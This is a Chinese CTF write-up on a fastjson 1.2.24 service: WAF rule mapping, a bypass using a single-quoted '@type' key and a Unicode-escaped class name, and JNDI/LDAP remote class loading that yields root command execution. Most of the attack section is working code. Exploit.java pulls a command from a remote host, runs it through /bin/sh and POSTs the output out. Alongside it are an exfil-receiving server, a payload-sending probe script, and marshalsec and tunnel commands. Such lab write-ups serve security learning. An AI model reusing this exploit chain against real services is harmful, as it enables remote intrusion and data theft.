---
title: "fastjson：WAF 绕过 + JNDI 远程类加载 RCE"
slug: "ctf-fastjson-waf-bypass-rce"
date: 2026-09-13T17:39:25+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "fastjson 1.2.24 经典漏洞：绕过 WAF 后用 JNDI 远程加载恶意类。"
summary: "fastjson 1.2.24 经典漏洞：绕过 WAF 后用 JNDI 远程加载恶意类。"
tags: ["CTF", "fastjson", "JNDI", "RCE"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 19
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/19.fastjson(WAF绕过+JNDI远程类加载RCE).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-fastjson-waf-bypass-rce/workflow.svg" alt="JSON 请求触发自动类型解析，应用随后向外部 LDAP/RMI 服务发起 JNDI 查询。" loading="lazy">
  <figcaption>图 1 · fastjson JNDI 攻击面。JSON 请求触发自动类型解析，应用随后向外部 LDAP/RMI 服务发起 JNDI 查询。</figcaption>
</figure>

网址:`http://203.0.113.13:42920/`(Tomcat 8.0.50 + fastjson 1.2.24)

## 1. 信息收集

- 1.首页注释`<!--1.2.24-->`直接泄漏版本,`/welcometofastjson/`是处理入口

```bash
curl.exe -s -i http://203.0.113.13:42920/
```

- 2.POST任意json,服务端`JSON.parseObject(body)`后回显`name`字段

```bash
curl.exe -s -X POST http://203.0.113.13:42920/welcometofastjson/ -H "Content-Type: application/json" -d "{\"name\":\"test\"}"
```

  - -->`{"data":"Hello test","success":200}`
- 3.`{"name":{"$ref":"$"}}`回显`{"data":"Hello {\"name\":{\"$ref\":\"@\"}}","success":200}`
  - -->`$ref`特殊键生效,确认服务端是`JSON.parseObject`且没有禁用特殊键

## 2. WAF规则测绘(本题关键)

- 4.发现双引号`@type`被拦,把各种变体都打一遍,实测出规则:
  - (1)双引号`"@type"`键(含`"\u0040type"`、嵌套在子对象里)-->返回`U cannot hacking me uhhhhhhhh!!!`
  - (2)请求任意位置出现完整类名`com.sun.rowset.JdbcRowSetImpl`-->同样拦截
  - (3)只出现前缀`com.sun.rowset.JdbcRowSet`、或加后缀`...XYZ`、或短名`JdbcRowSetImpl`-->都不拦
  - (4)`@type`只出现在值里(如`{"name":"@type"}`)-->不拦
- 学到:类名黑名单匹配的是**完整类名**而不是前缀,所以类名里随便转义一个字符就能绕
- 5.脚本化复测:`python probe.py waf`,17个用例一次出结论表

## 3. 两条WAF绕过

- (1)键绕过:用单引号键`'@type'`(WAF只识别双引号形式),值仍然必须是双引号-->fastjson照常识别`@type`
- (2)类名绕过:把`Impl`的`I`写成`\u0049`-->`com.sun.rowset.JdbcRowSet\u0049mpl`,躲开黑名单,fastjson照常解码回真类名
- 6.最终payload:
  - `{'@type':"com.sun.rowset.JdbcRowSet\u0049mpl","dataSourceName":"ldap://<隧道>/x","autoCommit":true}`
  - (注意:必须手工拼JSON,不能过`json.dumps`,否则`\u0049`会被再转义成`\\u0049`,目标就当成普通文本,不会触发JNDI)

## 4. 先验证反序列化生效(也顺便确认目标能出网)

- 7.DNS回显:`{'@type':"java.net.Inet4Address",'val':"xxx.dnslog.cn"}`
  - -->dnslog记录出现目标出口IP的解析请求`203.0.113.16`-->反序列化生效且目标可出网

## 5. 打通JNDI

- 8.本机没有公网IPv4(只有IPv6,目标不可达),用pinggy免费隧道把本地1389暴露到公网:

```bash
ssh -p 443 -R0:localhost:1389 tcp@a.pinggy.io
```

- 9.发payload后,自建LDAP服务收到`BindRequest`:
  - `30 0c 02 01 01 60 07 02 01 03 04 00 80 00`
  - 随后收到`SearchRequest(base="x",filter=(objectClass=*))`-->JNDI注入成功

## 6. 远程类加载RCE

- 10.`dual.py`在同一个端口上同时处理LDAP与HTTP(第一个字节是`0x30`就当LDAP,否则当HTTP):
  - (1)LDAP返回JNDI引用:`objectClass=javaNamingReference`、`javaClassName=Exploit`、`javaFactory=Exploit`、`javaCodeBase=http://<隧道>/`
  - (2)目标JDK 1.8.0_101<8u191,`trustURLCodebase`默认true-->会去`javaCodeBase`把`Exploit.class`拉下来
  - (3)`Class.forName(name,true,urlClassLoader)`触发类的`static{}`初始化块-->RCE
- 11.`Exploit`的static块干三件事:
  - (1)从`http://<隧道>/cmd.txt`取命令(命令放在文件里,想改命令不用重编译)
  - (2)`/bin/sh -c <cmd>`执行,收集stdout+stderr
  - (3)结果POST回`http://<隧道>/exfil`(另外留了DNS兜底)
- 学到:static块里所有异常都要吞掉,否则异常顺着JNDI调用栈抛回业务代码,页面报错、日志留痕

## 7. 拿flag

- 12.命令`cat /fffflag; wc -c /fffflag; md5sum /fffflag; id`回传:
  - `flag{5ecff859-1e6c-4a4f-908d-c2600a384566}`
  - `43 /fffflag`
  - `351f2f61f843735802d4e4eb47c07fd  /fffflag`
  - `uid=0(root) gid=0(root) groups=0(root)`
  - (flag在容器根目录`/fffflag`,43字节)

## 8. 对照(排除偶然)

- (1)双引号`"@type"`-->WAF拦截,没有任何回连
- (2)类名不做Unicode转义`com.sun.rowset.JdbcRowSetImpl`-->WAF拦截
- (3)`{@type:"..."}`不加引号-->500(fastjson语法错误),LDAP服务端也没有连接记录
- 学到:只有"单引号键+转义类名+JNDI回调"三件套同时成立,才有真实回连和命令输出

## 9. flag

- `flag{5ecff859-1e6c-4a4f-908d-c2600a384566}`

## 10. 环境与复现命令

- (1)编译远程加载类(必须是Java8字节码major=52,否则目标老JDK报`UnsupportedClassVersionError`):

```bash
javac --release 8 -encoding UTF-8 -d http_root Exploit.java
```

- (2)探测/回显/WAF测绘/DNS回显/JNDI payload:

```bash
python probe.py home|echo|waf|dns|jndi
```

- (3)起同端口LDAP+HTTP服务,再用隧道暴露1389:

```bash
python dual.py --port 1389
ssh -p 443 -R0:localhost:1389 tcp@a.pinggy.io
```

- (4)本地验证整条链(不用打目标):

```bash
java "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" -cp test JndiClient ldap://127.0.0.1:1389/x
```

- (5)脚本全文见下一节

## 可复现补充

## 11. 完整实验代码

下面三个文件构成最小 LDAP + HTTP 回传环境：

```text
http_root/
├─ Exploit.class
├─ cmd.txt
└─ exfil.txt       # 服务端接收后自动生成
serve.py
Exploit.java
probe_fastjson.py
```

### 11.1 Exploit.java

<details>
<summary>展开完整代码：Exploit.java</summary>

```java
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class Exploit {
    private static final String BASE = "http://127.0.0.1:8000";

    private static String readAll(InputStream input) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int read;
        while ((read = input.read(buffer)) != -1) {
            output.write(buffer, 0, read);
        }
        return new String(output.toByteArray(), StandardCharsets.UTF_8);
    }

    static {
        try {
            String command = readAll(new URL(BASE + "/cmd.txt").openStream()).trim();
            Process process = Runtime.getRuntime().exec(
                    new String[]{"/bin/sh", "-c", command}
            );

            String stdout = readAll(process.getInputStream());
            String stderr = readAll(process.getErrorStream());
            process.waitFor();

            HttpURLConnection connection =
                    (HttpURLConnection) new URL(BASE + "/exfil").openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            byte[] result = ("STDOUT\n" + stdout + "\nSTDERR\n" + stderr)
                    .getBytes(StandardCharsets.UTF_8);
            connection.setFixedLengthStreamingMode(result.length);
            try (OutputStream output = connection.getOutputStream()) {
                output.write(result);
            }
            connection.getResponseCode();
        } catch (Throwable ignored) {
            // A remote class should not leak a stack trace into the target app.
        }
    }

    public static void main(String[] args) {
        System.out.println("loaded");
    }
}
```

</details>

下载：[Exploit.java](/code/ctf-fastjson-waf-bypass-rce/Exploit.java)


把 `BASE` 改成目标可访问的隧道域名，然后编译为 Java 8 字节码：

```bash
mkdir -p http_root
javac --release 8 -encoding UTF-8 \
  -d http_root \
  Exploit.java
printf 'id; cat /fffflag' > http_root/cmd.txt
```

### 11.2 启动 HTTP 服务

<details>
<summary>展开完整代码：serve.py</summary>

```python
#!/usr/bin/env python3
"""Serve Exploit.class/cmd.txt and receive POST /exfil results."""

from __future__ import annotations

import argparse
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


class Handler(SimpleHTTPRequestHandler):
    def do_POST(self) -> None:
        if self.path != "/exfil":
            self.send_error(404)
            return

        length = int(self.headers.get("Content-Length", "0"))
        data = self.rfile.read(length)
        target = Path(self.directory) / "exfil.txt"
        target.write_bytes(data)
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt: str, *args) -> None:
        print(fmt % args)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--bind", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--directory", default="http_root")
    args = parser.parse_args()
    handler = lambda *a, **kw: Handler(*a, directory=args.directory, **kw)
    ThreadingHTTPServer((args.bind, args.port), handler).serve_forever()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

</details>

下载：[serve.py](/code/ctf-fastjson-waf-bypass-rce/serve.py)


```bash
python3 serve.py --bind 0.0.0.0 --port 8000 --directory http_root
```

### 11.3 启动 LDAP Reference 服务

本机已有 marshalsec：

```bash
java -cp 'D:\PBox-full\tools\gui_scan\spring\SpringBootVul-GUI\resources\marshalsec-0.0.3-SNAPSHOT-all.jar' \
  marshalsec.jndi.LDAPRefServer \
  'http://<public-host>:8000/#Exploit' 1389
```

如果需要隧道：

```bash
ssh -p 443 -R0:localhost:1389 tcp@a.pinggy.io
```

### 11.4 探测脚本

<details>
<summary>展开完整代码：probe_fastjson.py</summary>

```python
#!/usr/bin/env python3
"""Send authorized fastjson lab probes with raw JSON strings."""

from __future__ import annotations

import argparse
import json
import urllib.error
import urllib.request


def send(url: str, body: str, cookie: str = "") -> tuple[int, str]:
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(
        url,
        data=body.encode("utf-8"),
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("mode", choices=["home", "echo", "dns", "jndi"])
    parser.add_argument("--ldap", default="ldap://127.0.0.1:1389/x")
    parser.add_argument("--collab", default="test.example.com")
    parser.add_argument("--cookie", default="")
    args = parser.parse_args()

    if args.mode == "home":
        body = json.dumps({"name": "test"})
    elif args.mode == "echo":
        body = '{"name":{"$ref":"$"}}'
    elif args.mode == "dns":
        body = (
            "{'@type':\"java.net.Inet4Address\","
            f"'val':\"{args.collab}\""
            "}"
        )
    else:
        body = (
            "{'@type':\"com.sun.rowset.JdbcRowSet\\u0049mpl\","
            f"\"dataSourceName\":\"{args.ldap}\","
            "\"autoCommit\":true}"
        )

    status, text = send(args.url, body, args.cookie)
    print("payload:", body)
    print("status:", status)
    print("response:", text[:2000])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

</details>

下载：[probe_fastjson.py](/code/ctf-fastjson-waf-bypass-rce/probe_fastjson.py)


```bash
python3 probe_fastjson.py \
  'http://203.0.113.13:42920/welcometofastjson/' \
  home

python3 probe_fastjson.py \
  'http://203.0.113.13:42920/welcometofastjson/' \
  echo

python3 probe_fastjson.py \
  'http://203.0.113.13:42920/welcometofastjson/' \
  dns \
  --collab 'abc.example.com'

python3 probe_fastjson.py \
  'http://203.0.113.13:42920/welcometofastjson/' \
  jndi \
  --ldap 'ldap://<tunnel-host>/x'
```

## 12. 验证顺序

1. `home` 返回正常 JSON；
2. `echo` 证明特殊键生效；
3. `dns` 在 Collaborator/DNSLog 看到回连；
4. `jndi` 在 LDAP 服务端看到 Bind/Search；
5. HTTP 服务收到 `POST /exfil`；
6. `exfil.txt` 包含命令输出。

## 13. 常见失败

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| `UnsupportedClassVersionError` | 用高版本 JDK 编译 | `javac --release 8` |
| LDAP 没连接 | 单引号/转义被改 | 手工发原始 JSON |
| 类加载 404 | `javaCodeBase` 或文件名不对 | 确认 `Exploit.class` 可访问 |
| 无 exfil | BASE 不可达 | 目标侧能访问隧道 |
| 目标版本已修复 | `trustURLCodebase=false` | 停止，不要继续堆旧 payload |
